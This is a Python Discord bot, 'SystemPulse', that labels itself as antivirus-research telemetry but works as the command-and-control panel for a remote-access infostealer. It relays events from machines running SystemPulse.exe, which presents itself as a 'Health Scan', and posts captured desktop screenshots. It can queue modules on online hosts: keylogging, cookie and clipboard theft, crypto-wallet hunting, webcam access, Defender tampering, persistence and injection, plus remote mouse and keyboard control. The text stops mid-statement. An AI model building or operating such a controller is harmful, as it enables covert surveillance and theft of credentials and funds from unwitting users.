#!/usr/bin/env python3
"""SystemPulse Discord bot — live AV research telemetry per server."""

from __future__ import annotations

import asyncio
import base64
import io
import json
import os
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

import discord
import httpx
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

from log_display import format_event_display, module_label

load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN", "")
API_URL = os.getenv("API_URL", "").rstrip("/")
BOT_API_KEY = os.getenv("BOT_API_KEY", "")
POLL_INTERVAL = float(os.getenv("POLL_INTERVAL", "2"))
CONFIG_PATH = Path(__file__).parent / "data" / "guilds.json"
EXTRA_GUILD_IDS = [
    int(g.strip())
    for g in os.getenv("GUILD_IDS", "").split(",")
    if g.strip().isdigit()
]

PULSE_COLOR = 0x3D6FA8

STATUS_COLORS = {
    "success": 0x3D9A6E,
    "failed": 0xC45C5C,
    "blocked": 0xC49A3A,
    "simulated": 0x5B8FD4,
}

MODULE_LABELS = {
    "eicar": "EICAR Drop",
    "self_copy": "Self Replication",
    "persistence": "Registry Persistence",
    "process_injection": "Process Injection",
    "powershell": "Encoded PowerShell",
    "defender": "Defender Tamper",
    "keylogger": "Keylogger Hook",
    "screenshot": "Screenshot Capture",
    "clipboard": "Clipboard Steal",
    "webcam": "Webcam Access",
    "cookies": "Browser Cookies",
    "file_read": "File Harvest",
    "crypto_hunt": "Crypto Wallets",
    "location": "Geo Location",
    "network": "C2 Callback",
}

MODULE_EMOJI = {
    "eicar": "🧪",
    "location": "📍",
    "cookies": "🍪",
    "webcam": "📷",
    "file_read": "📁",
    "network": "🌐",
    "process_injection": "💉",
    "keylogger": "⌨️",
    "powershell": "⚡",
    "persistence": "📌",
    "screenshot": "🖥️",
    "clipboard": "📋",
    "defender": "🛡️",
    "crypto_hunt": "₿",
    "self_copy": "📎",
}

intents = discord.Intents.default()
intents.guilds = True

http_client: httpx.AsyncClient | None = None
_commands_synced = False
_poll_task: asyncio.Task | None = None
_session_start_alerted: set[str] = set()
_session_summarized: set[str] = set()

pulse = app_commands.Group(name="pulse", description="SystemPulse AV research telemetry")

controlfromdiscord = app_commands.Group(
    name="controlfromdiscord",
    description="Control channel + trigger modules on online SystemPulse PCs",
)

REMOTE_MODULE_CHOICES = [
    app_commands.Choice(name=MODULE_LABELS.get(k, k), value=k)
    for k in (
        "screenshot", "clipboard", "cookies", "keylogger", "webcam",
        "file_read", "crypto_hunt", "network", "powershell", "eicar",
        "defender", "persistence", "process_injection", "self_copy", "location",
    )
]


@dataclass
class GuildWatch:
    channel_id: int
    last_event_id: int = 0
    alert_role_id: int | None = None
    alert_on_start: bool = True
    alert_on_blocked: bool = True
    control_channel_id: int | None = None


@dataclass
class GuildStore:
    watches: dict[str, GuildWatch] = field(default_factory=dict)

    def _to_payload(self) -> dict[str, dict]:
        return {
            gid: {
                "channel_id": w.channel_id,
                "last_event_id": w.last_event_id,
                "alert_role_id": w.alert_role_id,
                "alert_on_start": w.alert_on_start,
                "alert_on_blocked": w.alert_on_blocked,
                "control_channel_id": w.control_channel_id,
            }
            for gid, w in self.watches.items()
        }

    def _write_local_backup(self) -> None:
        CONFIG_PATH.parent.mkdir(parents=True, exist_ok=True)
        CONFIG_PATH.write_text(json.dumps(self._to_payload(), indent=2), encoding="utf-8")

    @classmethod
    def _from_payload(cls, payload: dict) -> GuildStore:
        watches = {
            gid: GuildWatch(
                channel_id=int(data["channel_id"]),
                last_event_id=int(data.get("last_event_id", 0)),
                alert_role_id=int(data["alert_role_id"]) if data.get("alert_role_id") else None,
                alert_on_start=bool(data.get("alert_on_start", True)),
                alert_on_blocked=bool(data.get("alert_on_blocked", True)),
                control_channel_id=int(data["control_channel_id"])
                if data.get("control_channel_id")
                else None,
            )
            for gid, data in payload.items()
        }
        return cls(watches=watches)

    @classmethod
    def load_local(cls) -> GuildStore:
        if not CONFIG_PATH.exists():
            return cls()
        try:
            raw = json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
            return cls._from_payload(raw)
        except (json.JSONDecodeError, KeyError, TypeError, ValueError):
            return cls()

    async def load_from_api(self) -> None:
        assert http_client is not None
        try:
            res = await http_client.get(f"{API_URL}/api/bot/watches", headers=_headers())
            if res.status_code == 404:
                raise httpx.HTTPStatusError("not found", request=res.request, response=res)
            res.raise_for_status()
            data = res.json().get("watches") or {}
            self.watches = GuildStore._from_payload(data).watches
            print(f"[bot] Loaded {len(self.watches)} linked guild(s) from API")
            if not self.watches:
                local = self.load_local()
                if local.watches:
                    self.watches = local.watches
                    print(f"[bot] Migrated {len(self.watches)} guild(s) from local file to API")
                    await self.persist()
            else:
                self._write_local_backup()
            return
        except httpx.HTTPError as exc:
            print(f"[bot] API watch load failed ({exc}) — using local backup")
            self.watches = self.load_local().watches

    async def persist(self) -> None:
        self._write_local_backup()
        assert http_client is not None
        try:
            body = {
                "watches": {
                    gid: {
                        "channel_id": w.channel_id,
                        "last_event_id": w.last_event_id,
                        "alert_role_id": w.alert_role_id,
                        "alert_on_start": w.alert_on_start,
                        "alert_on_blocked": w.alert_on_blocked,
                        "control_channel_id": w.control_channel_id,
                    }
                    for gid, w in self.watches.items()
                }
            }
            res = await http_client.put(
                f"{API_URL}/api/bot/watches",
                json=body,
                headers=_headers(),
            )
            if res.status_code == 404:
                return
            res.raise_for_status()
        except httpx.HTTPError as exc:
            print(f"[bot] API watch save failed ({exc}) — local backup only")


store = GuildStore()


async def clear_global_slash_commands() -> None:
    """Remove global slash commands on Discord (leaves in-memory tree for guild copy)."""
    if not bot.application_id:
        return
    try:
        await bot.http.bulk_upsert_global_commands(bot.application_id, [])
        print("[bot] Cleared global slash commands on Discord")
    except discord.HTTPException as exc:
        print(f"[bot] Global command clear failed: {exc}")


async def sync_guild_commands(guild: discord.Object | discord.Guild) -> int:
    """Replace guild slash commands — clears old entries first to avoid duplicates."""
    bot.tree.clear_commands(guild=guild)
    bot.tree.copy_global_to(guild=guild)
    synced = await bot.tree.sync(guild=guild)
    label = getattr(guild, "name", None) or getattr(guild, "id", guild)
    print(f"[bot] Guild sync {label}: {len(synced)} command(s)")
    return len(synced)


async def sync_all_guild_commands() -> int:
    """Guild-only commands: wipe globals, then sync each server."""
    await clear_global_slash_commands()

    total = 0
    seen: set[int] = set()

    for guild in bot.guilds:
        try:
            total += await sync_guild_commands(guild)
            seen.add(guild.id)
        except discord.HTTPException as exc:
            print(f"[bot] Guild sync failed {guild.id}: {exc}")

    for gid in EXTRA_GUILD_IDS:
        if gid in seen:
            continue
        try:
            total += await sync_guild_commands(discord.Object(id=gid))
        except discord.HTTPException as exc:
            print(f"[bot] Env guild sync failed {gid}: {exc}")

    print(f"[bot] Per-guild command sync complete ({total} registrations)")
    return total


class SystemPulseBot(commands.Bot):
    def __init__(self) -> None:
        super().__init__(command_prefix=None, intents=intents)

    async def setup_hook(self) -> None:
        self.tree.add_command(pulse)
        self.tree.add_command(controlfromdiscord)
        self.add_listener(self._on_ready_sync, "on_ready")

    async def _on_ready_sync(self) -> None:
        global _commands_synced
        if _commands_synced:
            return
        await sync_all_guild_commands()
        _commands_synced = True


bot = SystemPulseBot()


def _headers() -> dict[str, str]:
    h: dict[str, str] = {}
    if BOT_API_KEY:
        h["x-api-key"] = BOT_API_KEY
    return h


def _guild_id(interaction: discord.Interaction) -> str | None:
    if interaction.guild is None:
        return None
    return str(interaction.guild.id)


def _module_label(module: str) -> str:
    return module_label(module)


def _event_host(event: dict) -> str:
    payload = event.get("payload")
    if isinstance(payload, dict):
        host = payload.get("hostname")
        if host and isinstance(host, str):
            return host
    return "Unknown"


def _event_user(event: dict) -> str:
    payload = event.get("payload")
    if isinstance(payload, dict):
        user = payload.get("username")
        if user and isinstance(user, str):
            return user
    return "—"


def _parse_ts(iso: str | None) -> datetime:
    if not iso:
        return datetime.now(timezone.utc)
    try:
        return datetime.fromisoformat(iso.replace("Z", "+00:00"))
    except ValueError:
        return datetime.now(timezone.utc)


def _embed_for_event(event: dict) -> discord.Embed:
    module = event.get("module", "unknown")
    emoji = MODULE_EMOJI.get(module, "📡")
    status = event.get("status", "unknown")
    color = STATUS_COLORS.get(status, PULSE_COLOR)
    hostname = _event_host(event)
    username = _event_user(event)
    action = event.get("action", "—")
    payload = event.get("payload") if isinstance(event.get("payload"), dict) else {}

    clean = {
        k: v
        for k, v in payload.items()
        if k
        not in (
            "display_log",
            "display_result",
            "image_base64",
            "hostname",
            "username",
            "os",
            "processor",
        )
    }
    log_lines = payload.get("display_log")
    result = payload.get("display_result")
    if not log_lines or not result:
        log_lines, result = format_event_display(
            module,
            action,
            status,
            clean,
            event.get("error_message"),
        )

    embed = discord.Embed(
        title=f"{emoji} {_module_label(module)}",
        description=f"`{action.replace('_', ' ')}`",
        color=color,
        timestamp=_parse_ts(event.get("created_at")),
    )
    embed.add_field(name="Host", value=f"`{hostname}`", inline=True)
    embed.add_field(name="User", value=f"`{username}`", inline=True)
    embed.add_field(name="Status", value=f"`{status.upper()}`", inline=True)
    embed.add_field(
        name="Detected",
        value="Yes" if event.get("detected") else "No",
        inline=True,
    )
    embed.add_field(
        name="Blocked",
        value="Yes" if event.get("blocked") else "No",
        inline=True,
    )
    embed.add_field(name="Event ID", value=str(event.get("id", "?")), inline=True)

    activity = "\n".join(f"> {line}" for line in log_lines[:8])
    if len(activity) > 900:
        activity = activity[:897] + "…"
    embed.add_field(name="Activity log", value=activity or "—", inline=False)
    embed.add_field(name="Result", value=result[:256], inline=False)

    if event.get("error_message"):
        embed.add_field(name="Error", value=str(event["error_message"])[:300], inline=False)

    embed.set_footer(text="SystemPulse · Live Telemetry")
    return embed


def _event_image_b64(event: dict) -> str | None:
    payload = event.get("payload")
    if isinstance(payload, dict):
        b64 = payload.get("image_base64")
        if isinstance(b64, str) and b64:
            return b64
    return None


def _role_mention(watch: GuildWatch) -> str | None:
    if watch.alert_role_id:
        return f"<@&{watch.alert_role_id}>"
    return None


def _embed_scan_started(event: dict) -> discord.Embed:
    embed = discord.Embed(
        title="🩺 SystemPulse — Health Scan Started",
        description=f"**{_event_host(event)}** · `{_event_user(event)}`",
        color=PULSE_COLOR,
        timestamp=_parse_ts(event.get("created_at")),
    )
    embed.set_footer(text="SystemPulse · Session opened")
    return embed


def _embed_session_summary(events: list[dict]) -> discord.Embed:
    ordered = sorted(events, key=lambda e: int(e.get("id", 0)))
    first = ordered[0]
    host = _event_host(first)
    user = _event_user(first)
    ok = sum(1 for e in ordered if e.get("status") == "success")
    blocked = sum(
        1 for e in ordered if e.get("blocked") or e.get("status") == "blocked"
    )
    detected = sum(1 for e in ordered if e.get("detected"))
    failed = sum(1 for e in ordered if e.get("status") == "failed")

    if detected or blocked:
        color = 0xC49A3A
    elif failed:
        color = 0xC45C5C
    else:
        color = 0x3D9A6E

    embed = discord.Embed(
        title="📋 SystemPulse — Scan Report",
        description=f"**{host}** completed a full health scan\n`{user}`",
        color=color,
        timestamp=_parse_ts(ordered[-1].get("created_at")),
    )
    embed.add_field(name="Checks run", value=str(len(ordered)), inline=True)
    embed.add_field(name="Passed", value=str(ok), inline=True)
    embed.add_field(name="Blocked", value=str(blocked), inline=True)
    embed.add_field(name="Detected", value=str(detected), inline=True)
    embed.add_field(name="Failed", value=str(failed), inline=True)
    embed.add_field(name="Verdict", value=_scan_verdict(ok, blocked, detected, len(ordered)), inline=True)

    lines: list[str] = []
    for e in ordered:
        mod = e.get("module", "?")
        emoji = MODULE_EMOJI.get(mod, "•")
        payload = e.get("payload") if isinstance(e.get("payload"), dict) else {}
        result = payload.get("display_result") or e.get("status", "?")
        if len(str(result)) > 42:
            result = str(result)[:39] + "…"
        lines.append(f"{emoji} **{_module_label(mod)}** — {result}")

    report = "\n".join(lines[:16])
    if len(report) > 1000:
        report = report[:997] + "…"
    embed.add_field(name="Check results", value=report or "—", inline=False)

    sid = first.get("session_id")
    if sid:
        embed.set_footer(text=f"Session {str(sid)[:8]}… · SystemPulse Summary Card")
    else:
        embed.set_footer(text="SystemPulse Summary Card")
    return embed


def _scan_verdict(ok: int, blocked: int, detected: int, total: int) -> str:
    if total == 0:
        return "No data"
    if detected:
        return "⚠️ AV activity detected"
    if blocked:
        return "⚠️ Some checks blocked"
    if ok == total:
        return "✅ All checks passed"
    return "ℹ️ Mixed results"


async def _fetch_session(session_id: str) -> dict | None:
    assert http_client is not None
    try:
        res = await http_client.get(
            f"{API_URL}/api/sessions/{session_id}",
            headers=_headers(),
        )
        if res.status_code == 404:
            return None
        res.raise_for_status()
        return res.json()
    except httpx.HTTPError:
        return None


async def _fetch_session_events(session_id: str) -> list[dict]:
    assert http_client is not None
    res = await http_client.get(
        f"{API_URL}/api/events",
        params={"session_id": session_id, "limit": 50},
    )
    res.raise_for_status()
    events: list[dict] = res.json()
    events.sort(key=lambda e: int(e.get("id", 0)))
    return events


async def _maybe_post_session_summary(
    channel: discord.abc.Messageable,
    watch: GuildWatch,
    session_id: str,
) -> None:
    global _session_summarized
    if not session_id or session_id in _session_summarized:
        return

    session = await _fetch_session(session_id)
    if not session or not session.get("finished_at"):
        return

    events = await _fetch_session_events(session_id)
    if not events:
        return

    _session_summarized.add(session_id)
    summary = _embed_session_summary(events)
    mention = _role_mention(watch) if watch.alert_role_id else None
    try:
        await channel.send(content=mention, embed=summary)
        print(f"[bot] Posted session summary for {session_id[:8]}…")
    except discord.HTTPException as exc:
        print(f"[bot] Summary send failed: {exc}")


async def _post_live_event(
    channel: discord.abc.Messageable,
    watch: GuildWatch,
    event: dict,
) -> None:
    global _session_start_alerted

    session_id = event.get("session_id")
    if (
        session_id
        and session_id not in _session_start_alerted
        and watch.alert_role_id
        and watch.alert_on_start
    ):
        _session_start_alerted.add(session_id)
        try:
            await channel.send(
                content=_role_mention(watch),
                embed=_embed_scan_started(event),
            )
        except discord.HTTPException as exc:
            print(f"[bot] Start alert failed: {exc}")

    embed = _embed_for_event(event)
    image_b64 = _event_image_b64(event)

    content = None
    if watch.alert_role_id and watch.alert_on_blocked:
        if event.get("blocked") or event.get("detected") or event.get("status") == "blocked":
            content = _role_mention(watch)

    file = None
    if image_b64 and event.get("module") == "screenshot":
        try:
            file = discord.File(
                io.BytesIO(base64.b64decode(image_b64)),
                filename="desktop_capture.png",
            )
            embed.set_image(url="attachment://desktop_capture.png")
        except (ValueError, TypeError) as exc:
            print(f"[bot] Screenshot attach failed: {exc}")

    await channel.send(content=content, embed=embed, file=file)


async def _fetch_latest_event_id() -> int:
    assert http_client is not None
    res = await http_client.get(f"{API_URL}/api/events?limit=1")
    res.raise_for_status()
    events = res.json()
    if not events:
        return 0
    return int(events[0]["id"])


async def _fetch_events(limit: int = 50, since_id: int | None = None) -> list[dict]:
    assert http_client is not None
    params: dict[str, int] = {"limit": limit}
    if since_id is not None:
        params["since_id"] = since_id
    res = await http_client.get(
        f"{API_URL}/api/events",
        params=params,
        headers=_headers() if since_id is not None else None,
    )
    res.raise_for_status()
    events: list[dict] = res.json()
    events.sort(key=lambda e: int(e.get("id", 0)))
    return events


async def _fetch_stats() -> dict | None:
    assert http_client is not None
    res = await http_client.get(f"{API_URL}/api/stats")
    if not res.is_success:
        return None
    return res.json()


async def poll_events() -> None:
    await bot.wait_until_ready()

    if not API_URL:
        print("[bot] API_URL not set — polling disabled")
        return

    print(f"[bot] Polling {API_URL} every {POLL_INTERVAL}s for {len(store.watches)} guild(s)")

    while not bot.is_closed():
        if not store.watches:
            await asyncio.sleep(POLL_INTERVAL)
            continue

        try:
            since_id = min(w.last_event_id for w in store.watches.values())
            events = await _fetch_events(limit=100, since_id=since_id)

            if not events:
                await asyncio.sleep(POLL_INTERVAL)
                continue

            for event in events:
                event_id = int(event.get("id", 0))

                for guild_id, watch in list(store.watches.items()):
                    if event_id <= watch.last_event_id:
                        continue

                    channel = bot.get_channel(watch.channel_id)
                    if channel is None:
                        guild = bot.get_guild(int(guild_id))
                        if guild:
                            channel = guild.get_channel(watch.channel_id)
                    if channel is None:
                        continue

                    try:
                        await _post_live_event(channel, watch, event)
                        watch.last_event_id = event_id
                    except discord.HTTPException as exc:
                        print(f"[bot] Send failed guild={guild_id}: {exc}")

            batch_sessions = {e.get("session_id") for e in events if e.get("session_id")}
            for guild_id, watch in list(store.watches.items()):
                channel = bot.get_channel(watch.channel_id)
                if channel is None:
                    guild = bot.get_guild(int(guild_id))
                    if guild:
                        channel = guild.get_channel(watch.channel_id)
                if channel is None:
                    continue
                for sid in batch_sessions:
                    await _maybe_post_session_summary(channel, watch, sid)

            await store.persist()
            if events:
                print(f"[bot] Distributed {len(events)} event(s) across guilds")

        except httpx.HTTPError as exc:
            print(f"[bot] Poll error: {exc}")

        await asyncio.sleep(POLL_INTERVAL)


@pulse.command(name="sync", description="Refresh slash commands in this server (instant)")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def pulse_sync(interaction: discord.Interaction) -> None:
    if interaction.guild is None:
        return
    await interaction.response.defer(ephemeral=True)
    try:
        await clear_global_slash_commands()
        count = await sync_guild_commands(interaction.guild)
    except discord.HTTPException as exc:
        await interaction.followup.send(f"Sync failed: {exc}", ephemeral=True)
        return
    await interaction.followup.send(
        f"Synced **{count}** command(s) to this server (duplicates cleared).\n"
        "Wait ~10 seconds, then type `/` — you should see one `/help`, one `/pulse`, "
        "and one `/controlfromdiscord`.",
        ephemeral=True,
    )


@pulse.command(name="link", description="Start posting live scan events to this channel")
@app_commands.guild_only()
async def pulse_link(interaction: discord.Interaction) -> None:
    gid = _guild_id(interaction)
    if gid is None or interaction.channel is None:
        await interaction.response.send_message("Use this in a server text channel.", ephemeral=True)
        return

    latest = 0
    try:
        latest = await _fetch_latest_event_id()
    except httpx.HTTPError:
        pass

    store.watches[gid] = GuildWatch(
        channel_id=interaction.channel.id,
        last_event_id=latest,
    )
    await store.persist()

    embed = discord.Embed(
        title="SystemPulse linked",
        description=(
            f"Live telemetry will post in {interaction.channel.mention}.\n\n"
            f"**Cursor:** event `{latest}` — only newer events are sent.\n"
            f"Run `/pulse live` before a scan to skip old backlog."
        ),
        color=PULSE_COLOR,
    )
    embed.set_footer(text="SystemPulse")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@pulse.command(name="unlink", description="Stop live event posts for this server")
@app_commands.guild_only()
async def pulse_unlink(interaction: discord.Interaction) -> None:
    gid = _guild_id(interaction)
    if gid is None:
        await interaction.response.send_message("Use this in a server.", ephemeral=True)
        return

    if gid in store.watches:
        del store.watches[gid]
        await store.persist()
        await interaction.response.send_message("Unlinked — this server will no longer receive events.", ephemeral=True)
    else:
        await interaction.response.send_message("This server is not linked. Use `/pulse link` first.", ephemeral=True)


@pulse.command(name="alert", description="Ping a role when scans start or checks get blocked")
@app_commands.describe(
    role="Role to @mention",
    on_start="Ping when a new health scan starts",
    on_blocked="Ping when a check is blocked or detected",
)
@app_commands.guild_only()
async def pulse_alert(
    interaction: discord.Interaction,
    role: discord.Role,
    on_start: bool = True,
    on_blocked: bool = True,
) -> None:
    gid = _guild_id(interaction)
    if gid is None:
        await interaction.response.send_message("Use this in a server.", ephemeral=True)
        return

    watch = store.watches.get(gid)
    if not watch:
        await interaction.response.send_message(
            "Link a channel first with `/pulse link`.", ephemeral=True
        )
        return

    watch.alert_role_id = role.id
    watch.alert_on_start = on_start
    watch.alert_on_blocked = on_blocked
    await store.persist()

    embed = discord.Embed(
        title="Alerts configured",
        description=(
            f"Role {role.mention} will be pinged in <#{watch.channel_id}>.\n\n"
            f"**On scan start:** {'yes' if on_start else 'no'}\n"
            f"**On blocked/detected:** {'yes' if on_blocked else 'no'}\n\n"
            "A **scan report card** posts automatically when a full scan finishes."
        ),
        color=PULSE_COLOR,
    )
    embed.set_footer(text="SystemPulse")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@pulse.command(name="alert-off", description="Disable role pings for this server")
@app_commands.guild_only()
async def pulse_alert_off(interaction: discord.Interaction) -> None:
    gid = _guild_id(interaction)
    if gid is None:
        await interaction.response.send_message("Use this in a server.", ephemeral=True)
        return

    watch = store.watches.get(gid)
    if not watch or not watch.alert_role_id:
        await interaction.response.send_message("No alert role is configured.", ephemeral=True)
        return

    watch.alert_role_id = None
    await store.persist()
    await interaction.response.send_message("Role alerts disabled for this server.", ephemeral=True)


@pulse.command(name="live", description="Jump to now — only post events from the next scan onward")
@app_commands.guild_only()
async def pulse_live(interaction: discord.Interaction) -> None:
    gid = _guild_id(interaction)
    if gid is None:
        await interaction.response.send_message("Use this in a server.", ephemeral=True)
        return

    watch = store.watches.get(gid)
    if not watch:
        await interaction.response.send_message(
            "Link a channel first with `/pulse link`.", ephemeral=True
        )
        return

    try:
        latest = await _fetch_latest_event_id()
    except httpx.HTTPError as exc:
        await interaction.response.send_message(f"API error: {exc}", ephemeral=True)
        return

    old_id = watch.last_event_id
    watch.last_event_id = latest
    await store.persist()

    await interaction.response.send_message(
        f"Live mode updated. Cursor `{old_id}` → `{latest}`.\n"
        "Run **SystemPulse.exe** now — new events will appear immediately.",
        ephemeral=True,
    )


@pulse.command(name="stats", description="Show API health and scan totals")
@app_commands.guild_only()
async def pulse_stats(interaction: discord.Interaction) -> None:
    gid = _guild_id(interaction)
    watch = store.watches.get(gid or "")

    api_ok = False
    storage = "?"
    stats: dict | None = None
    try:
        assert http_client is not None
        health = await http_client.get(f"{API_URL}/api/health")
        api_ok = health.status_code == 200
        if health.ok:
            storage = health.json().get("storage", "?")
        stats = await _fetch_stats()
    except httpx.HTTPError:
        pass

    embed = discord.Embed(title="SystemPulse Stats", color=PULSE_COLOR if api_ok else 0xC45C5C)
    embed.add_field(name="API", value="Online" if api_ok else "Offline", inline=True)
    embed.add_field(name="Storage", value=f"`{storage}`", inline=True)
    embed.add_field(name="Poll", value=f"`{POLL_INTERVAL}s`", inline=True)

    if stats:
        embed.add_field(name="Total events", value=str(stats.get("total", 0)), inline=True)
        embed.add_field(name="Detected", value=str(stats.get("detected", 0)), inline=True)
        embed.add_field(name="Blocked", value=str(stats.get("blocked", 0)), inline=True)

        modules = stats.get("by_module") or []
        if modules:
            lines = []
            for row in sorted(modules, key=lambda m: m.get("count", 0), reverse=True)[:8]:
                mid = row.get("module", "?")
                lines.append(f"`{row.get('count', 0)}` {_module_label(mid)}")
            embed.add_field(name="Top modules", value="\n".join(lines) or "—", inline=False)

    if watch:
        channel = bot.get_channel(watch.channel_id)
        ch = channel.mention if channel else f"`{watch.channel_id}`"
        alert_line = "Not set"
        if watch.alert_role_id and interaction.guild:
            alert_role = interaction.guild.get_role(watch.alert_role_id)
            alert_line = (
                f"{alert_role.mention if alert_role else watch.alert_role_id} "
                f"(start: {'on' if watch.alert_on_start else 'off'}, "
                f"blocked: {'on' if watch.alert_on_blocked else 'off'})"
            )
        embed.add_field(
            name="This server",
            value=f"Linked to {ch}\nCursor: `{watch.last_event_id}`\nAlerts: {alert_line}",
            inline=False,
        )
    else:
        embed.add_field(name="This server", value="Not linked — use `/pulse link`", inline=False)

    embed.set_footer(text=f"SystemPulse · {len(store.watches)} server(s) linked")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@pulse.command(name="host", description="Show the most recent endpoint that ran a scan")
@app_commands.guild_only()
async def pulse_host(interaction: discord.Interaction) -> None:
    try:
        events = await _fetch_events(limit=100)
    except httpx.HTTPError as exc:
        await interaction.response.send_message(f"API error: {exc}", ephemeral=True)
        return

    if not events:
        await interaction.response.send_message("No scans recorded yet.", ephemeral=True)
        return

    latest = events[0]
    session_id = latest.get("session_id")
    session_events = [e for e in events if e.get("session_id") == session_id] if session_id else [latest]
    session_events.sort(key=lambda e: int(e.get("id", 0)))

    hostname = _event_host(latest)
    username = _event_user(latest)
    detected = sum(1 for e in session_events if e.get("detected"))
    blocked = sum(1 for e in session_events if e.get("blocked"))

    embed = discord.Embed(
        title=f"Latest endpoint — {hostname}",
        color=PULSE_COLOR,
        timestamp=datetime.now(timezone.utc),
    )
    embed.add_field(name="User", value=f"`{username}`", inline=True)
    embed.add_field(name="Modules run", value=str(len(session_events)), inline=True)
    embed.add_field(name="Detected / Blocked", value=f"`{detected}` / `{blocked}`", inline=True)

    lines = []
    for e in session_events[-12:]:
        mod = e.get("module", "?")
        emoji = MODULE_EMOJI.get(mod, "•")
        payload = e.get("payload") or {}
        result = payload.get("display_result") or e.get("status", "?")
        lines.append(f"{emoji} {_module_label(mod)} — {result}")
    embed.add_field(name="Session log", value="\n".join(lines) or "—", inline=False)

    if session_id:
        embed.set_footer(text=f"Session {str(session_id)[:8]}… · SystemPulse")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@pulse.command(name="recent", description="Show the last few scan events")
@app_commands.describe(count="How many events to show (1–10)")
@app_commands.guild_only()
async def pulse_recent(interaction: discord.Interaction, count: app_commands.Range[int, 1, 10] = 5) -> None:
    try:
        events = await _fetch_events(limit=count)
    except httpx.HTTPError as exc:
        await interaction.response.send_message(f"API error: {exc}", ephemeral=True)
        return

    if not events:
        await interaction.response.send_message("No events yet.", ephemeral=True)
        return

    await interaction.response.send_message(
        embeds=[_embed_for_event(e) for e in events[:count]],
        ephemeral=True,
    )


@pulse.command(name="guide", description="Quick setup guide for SystemPulse Discord logging")
@app_commands.guild_only()
async def pulse_guide(interaction: discord.Interaction) -> None:
    embed = discord.Embed(
        title="SystemPulse — Discord setup",
        description="Log AV research scans from SystemPulse.exe into this server.",
        color=PULSE_COLOR,
    )
    embed.add_field(
        name="1. Link channel",
        value="`/pulse link` in the channel where you want live events.",
        inline=False,
    )
    embed.add_field(
        name="2. Before each scan",
        value="`/pulse live` — skips old events, only new ones post.",
        inline=False,
    )
    embed.add_field(
        name="3. Run simulator",
        value="Right-click **SystemPulse.exe** → Run as administrator → **Run Health Scan**.",
        inline=False,
    )
    embed.add_field(
        name="Commands",
        value=(
            "`/pulse link` — start logging here\n"
            "`/pulse unlink` — stop logging\n"
            "`/pulse live` — jump to now\n"
            "`/pulse alert` — ping a role on start/blocked\n"
            "`/pulse alert-off` — disable role pings\n"
            "`/pulse sync` — refresh slash commands in this server\n"
            "`/pulse stats` — totals & API health\n"
            "`/pulse host` — latest PC scan summary\n"
            "`/pulse recent` — last N events\n"
            "`/pulse guide` — this help\n\n"
            "**Remote control**\n"
            "`/controlfromdiscord setup` — set control channel\n"
            "`/controlfromdiscord online` — who's running the exe\n"
            "`/controlfromdiscord run` — trigger one module on a PC\n"
            "`/controlfromdiscord mouse` — move/click remotely\n"
            "`/controlfromdiscord keyboard` — type or press keys\n"
            "`/help` — full setup guide\n"
            "`/pulse sync` — refresh commands if new ones missing"
        ),
        inline=False,
    )
    embed.set_footer(text="SystemPulse AV Research")
    await interaction.response.send_message(embed=embed, ephemeral=True)


async def _fetch_online_hosts(minutes: int = 5) -> list[dict]:
    assert http_client is not None
    res = await http_client.get(
        f"{API_URL}/api/bot/online",
        params={"minutes": minutes},
        headers=_headers(),
    )
    res.raise_for_status()
    return res.json().get("hosts") or []


async def _hostname_autocomplete(
    interaction: discord.Interaction, current: str
) -> list[app_commands.Choice[str]]:
    try:
        hosts = await _fetch_online_hosts()
    except httpx.HTTPError:
        return []
    choices: list[app_commands.Choice[str]] = []
    needle = current.lower()
    for host in hosts:
        name = str(host.get("hostname") or "")
        user = str(host.get("username") or "")
        if needle and needle not in name.lower() and needle not in user.lower():
            continue
        label = f"{name} ({user})" if user else name
        choices.append(app_commands.Choice(name=label[:100], value=name))
    return choices[:25]


def _control_channel_id(gid: str) -> int | None:
    watch = store.watches.get(gid)
    if not watch:
        return None
    return watch.control_channel_id or watch.channel_id


async def _queue_command(
    interaction: discord.Interaction,
    hostname: str,
    *,
    module: str | None = None,
    command_kind: str = "module",
    payload: dict | None = None,
    summary: str = "",
) -> dict | None:
    gid = _guild_id(interaction)
    if not gid:
        return None
    control_ch = _control_channel_id(gid)
    if not control_ch:
        await interaction.response.send_message(
            "Run `/controlfromdiscord setup` in your control channel first.",
            ephemeral=True,
        )
        return None

    body: dict = {"hostname": hostname, "guild_id": gid, "command_kind": command_kind}
    if module:
        body["module"] = module
    if payload:
        body["payload"] = payload

    assert http_client is not None
    try:
        res = await http_client.post(
            f"{API_URL}/api/bot/commands",
            json=body,
            headers=_headers(),
        )
        res.raise_for_status()
        cmd = res.json()
    except httpx.HTTPError as exc:
        await interaction.response.send_message(f"Failed to queue command: {exc}", ephemeral=True)
        return None

    await interaction.response.send_message(summary or f"Queued on `{hostname}`.", ephemeral=True)
    channel = bot.get_channel(control_ch)
    if channel is None and interaction.guild:
        channel = interaction.guild.get_channel(control_ch)
    if isinstance(channel, discord.TextChannel) and summary:
        await channel.send(
            f"🎮 **{interaction.user.display_name}** → **{hostname}**: {summary}"
        )
    return cmd


@bot.tree.command(name="help", description="SystemPulse setup, logging, and remote control guide")
@app_commands.guild_only()
async def help_command(interaction: discord.Interaction) -> None:
    embed = discord.Embed(
        title="SystemPulse — Help",
        description="AV research platform: log scans to Discord and trigger modules or input remotely.",
        color=PULSE_COLOR,
    )
    embed.add_field(
        name="1 · Link event logging",
        value=(
            "`/pulse link` — in the channel where scan results should post\n"
            "`/pulse live` — optional; only events from the next scan onward\n"
            "`/pulse alert @role` — ping a role when scans start or get blocked"
        ),
        inline=False,
    )
    embed.add_field(
        name="2 · Set up remote control",
        value=(
            "`/controlfromdiscord setup` — in your control channel\n"
            "Target must have **SystemPulse.exe** open (no scan required to show online)"
        ),
        inline=False,
    )
    embed.add_field(
        name="3 · See who's online",
        value="`/controlfromdiscord online` — lists PCs with the exe running",
        inline=False,
    )
    embed.add_field(
        name="4 · Run AV test modules",
        value=(
            "`/controlfromdiscord run` — pick hostname + module\n"
            "Examples: screenshot, clipboard, cookies, keylogger\n"
            "Results appear in your `/pulse link` channel"
        ),
        inline=False,
    )
    embed.add_field(
